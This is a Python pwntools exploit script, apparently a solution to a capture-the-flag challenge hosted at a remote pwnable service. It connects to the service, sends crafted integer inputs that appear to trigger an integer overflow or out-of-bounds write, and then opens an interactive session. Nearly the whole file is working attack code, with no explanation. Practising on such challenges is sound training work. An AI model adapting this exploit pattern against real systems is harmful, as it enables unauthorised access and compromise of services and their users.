#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './challenge'
elf = ELF(binary)
libc = elf.libc

# io = process(binary, aslr = 0)
io = remote('svc.pwnable.xyz', 30008)
context.log_level = 'debug'
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

io.recvuntil("x: ")
io.sendline('4294967295')
io.recvuntil("y: ")
io.sendline('4294965958')

io.recvuntil("=== t00leet ===")
io.sendline('3 1431656211')

io.sendline('0 0 0 0 0')






io.interactive()
